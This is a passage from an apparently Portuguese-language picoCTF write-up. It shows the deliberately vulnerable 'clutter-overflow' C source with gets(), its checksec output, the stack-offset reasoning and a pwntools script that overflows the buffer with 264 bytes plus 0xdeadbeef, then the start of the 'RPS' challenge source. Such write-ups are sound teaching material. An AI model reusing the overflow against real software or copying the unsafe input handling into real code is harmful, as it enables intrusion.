</span></span><span class=line><span class=cl><span class=s>&#34;|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  </span><span class=se>\\</span><span class=s>^ ^ |</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   </span><span class=se>\\</span><span class=s> ^ _ ^ / |                | </span><span class=se>\\</span><span class=s>^ ^|</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;| ^/_</span><span class=se>\\</span><span class=s>^ ^ ^ /_________</span><span class=se>\\</span><span class=s>^ ^ ^ /_</span><span class=se>\\</span><span class=s> | //  | /_</span><span class=se>\\</span><span class=s> ^| |   ____  ____   | | ^ |</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^</span><span class=se>\\</span><span class=s>___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;|^ ^ ^ ^ ^| /     (   </span><span class=se>\\</span><span class=s> | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  </span><span class=se>\\</span><span class=s>|^ ^|</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||</span><span class=se>\\</span><span class=s> |^ ^|</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;|&#39;.____&#39;_^||/!</span><span class=se>\\</span><span class=s>@@@@@/!</span><span class=se>\\</span><span class=s>|| _&#39;______________.&#39;|==                    =====</span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;|</span><span class=se>\\</span><span class=s>|______|===============|________________|/|</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\&#34;</span><span class=s> ||</span><span class=se>\&#34;\&#34;\&#34;\&#34;</span><span class=s>||</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;</span><span class=s>||</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;</span><span class=s>||</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;</span><span class=s>  </span><span class=se>\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\&#34;\&#34;</span><span class=s>&#39;&#39;</span><span class=se>\&#34;\&#34;\&#34;\&#34;</span><span class=s>&#39;&#39;</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;</span><span class=s>&#39;&#39;</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;</span><span class=s>&#39;&#39;</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\n</span><span class=s>&#34;</span>
</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;\&#34;</span><span class=s>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>code</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>clutter</span><span class=p>[</span><span class=n>SIZE</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=n>HEADER</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;My room is so cluttered...&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;What do you see?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>gets</span><span class=p>(</span><span class=n>clutter</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>code</span> <span class=o>==</span> <span class=n>GOAL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;code == 0x%llx: how did that happen??</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GOAL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;take a flag for your troubles&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=s>&#34;cat flag.txt&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;code == 0x%llx</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;code != 0x%llx :(</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>GOAL</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>E aqui o checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>    Arch:     amd64-64-little
</span></span><span class=line><span class=cl>    RELRO:    Partial RELRO
</span></span><span class=line><span class=cl>    Stack:    No canary found
</span></span><span class=line><span class=cl>    NX:       NX enabled
</span></span><span class=line><span class=cl>    PIE:      No PIE (0x400000)
</span></span></code></pre></td></tr></table></div></div><p>Como podemos ver no código fonte, <code>clutter</code> é um buffer de caracteres com tamanho <code>0x100</code>. Precisamos sobrescrever a variável <code>long code</code> com o valor <code>0xdeadbeef</code> para imprimir a flag.</p><p>Como é uma variável local, <code>long code</code> provavelmente estará na pilha. Vamos inserir um breakpoint logo antes da função <code>gets</code> e dar uma olhada na pilha nesse momento:</p><p><img alt=cof1 loading=lazy src=/images/davi-post-pwn/clutter-overflow/co1.png></p><p><code>0x7fffffffdff0</code> é o endereço no registro <code>rbp</code>. Se olharmos para o valor imediatamente antes disso, há uma série de 0&rsquo;s, que provavelmente são a variável <code>code</code>. Eles estão no endereço <code>0x7fffffffdfe8</code>. Fazendo uma simples matemática com o endereço do topo da pilha e o endereço da variável, obtemos: <code>0x7fffffffdfe8 - 0x7fffffffdee0 = 264</code>. Portanto, precisamos fornecer uma entrada de 264 caracteres + 0xdeadbeef para sobrescrever precisamente a variável code com o <code>GOAL</code>.</p><p>Aqui o meu solve:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;mars.picoctf.net&#34;</span><span class=p>,</span> <span class=mi>31890</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span> <span class=o>*</span> <span class=mi>264</span>
</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0xdeadbeef</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=rps>RPS<a hidden class=anchor aria-hidden=true href=#rps>#</a></h2><p>Esse é um chall simples em que você só precisa ler o source code e ver o que está errado. Aqui está ele:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdbool.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;time.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;unistd.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/time.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;sys/types.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>#define WAIT 60
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=k>const</span> <span class=kt>char</span><span class=o>*</span> <span class=n>flag</span> <span class=o>=</span> <span class=s>&#34;[REDACTED]&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=n>hands</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;rock&#34;</span><span class=p>,</span> <span class=s>&#34;paper&#34;</span><span class=p>,</span> <span class=s>&#34;scissors&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>char</span><span class=o>*</span> <span class=n>loses</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>{</span><span class=s>&#34;paper&#34;</span><span class=p>,</span> <span class=s>&#34;scissors&#34;</span><span class=p>,</span> <span class=s>&#34;rock&#34;</span><span class=p>};</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=n>wins</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>input</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>l</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>fd_set</span>          <span class=n>input_set</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>timeval</span>  <span class=n>timeout</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span>             <span class=n>ready_for_reading</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>int</span>             <span class=n>read_bytes</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span> <span class=n>l</span> <span class=o>&lt;=</span> <span class=mi>0</span> <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;&#39;l&#39; for tgetinput must be greater than 0</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=o>-</span><span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Empty the FD Set */</span>
</span></span><span class=line><span class=cl>    <span class=nf>FD_ZERO</span><span class=p>(</span><span class=o>&amp;</span><span class=n>input_set</span> <span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Listen to the input descriptor */</span>
</span></span><span class=line><span class=cl>    <span class=nf>FD_SET</span><span class=p>(</span><span class=n>STDIN_FILENO</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input_set</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=cm>/* Waiting for some seconds */</span>
</span></span><span class=line><span class=cl>    <span class=n>timeout</span><span class=p>.</span><span class=n>tv_sec</span> <span class=o>=</span> <span class=n>WAIT</span><span class=p>;</span>    <span class=c1>// WAIT seconds
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>timeout</span><span class=p>.</span><span class=n>tv_usec</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>    <span class=c1>// 0 milliseconds
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Listening for input stream for any activity */</span>
</span></span><span class=line><span class=cl>    <span class=n>ready_for_reading</span> <span class=o>=</span> <span class=nf>select</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>input_set</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=nb>NULL</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>timeout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=cm>/* Here, first parameter is number of FDs in the set,
</span></span></span><span class=line><span class=cl><span class=cm>     * second is our FD set for reading,
</span></span></span><span class=line><span class=cl><span class=cm>     * third is the FD set in which any write activity needs to updated,
</span></span></span><span class=line><span class=cl><span class=cm>     * which is not required in this case.
</span></span></span><span class=line><span class=cl><span class=cm>     * Fourth is timeout
</span></span></span><span class=line><span class=cl><span class=cm>     */</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ready_for_reading</span> <span class=o>==</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=cm>/* Some error has occured in input */</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Unable to read your input</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>ready_for_reading</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>read_bytes</span> <span class=o>=</span> <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>input</span><span class=p>,</span> <span class=n>l</span><span class=o>-</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>input</span><span class=p>[</span><span class=n>read_bytes</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>==</span><span class=sc>&#39;\n&#39;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=o>--</span><span class=n>read_bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>input</span><span class=p>[</span><span class=n>read_bytes</span><span class=p>]</span><span class=o>=</span><span class=sc>&#39;\0&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=n>read_bytes</span><span class=o>==</span><span class=mi>0</span><span class=p>){</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;No data given.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>-</span><span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Timed out waiting for user input. Press Ctrl-C to disconnect</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>bool</span> <span class=nf>play</span> <span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>player_turn</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=nf>srand</span><span class=p>(</span><span class=nf>time</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>r</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Please make your selection (rock/paper/scissors):</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>r</span> <span class=o>=</span> <span class=nf>tgetinput</span><span class=p>(</span><span class=n>player_turn</span><span class=p>,</span> <span class=mi>100</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Timeout on user input
</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=k>if</span><span class=p>(</span><span class=n>r</span> <span class=o>==</span> <span class=o>-</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Goodbye!</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>computer_turn</span> <span class=o>=</span> <span class=nf>rand</span><span class=p>()</span> <span class=o>%</span> <span class=mi>3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You played: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>player_turn</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;The computer played: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>hands</span><span class=p>[</span><span class=n>computer_turn</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nf>strstr</span><span class=p>(</span><span class=n>player_turn</span><span class=p>,</span> <span class=n>loses</span><span class=p>[</span><span class=n>computer_turn</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;You win! Play again?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;Seems like you didn&#39;t win this time. Play again?&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
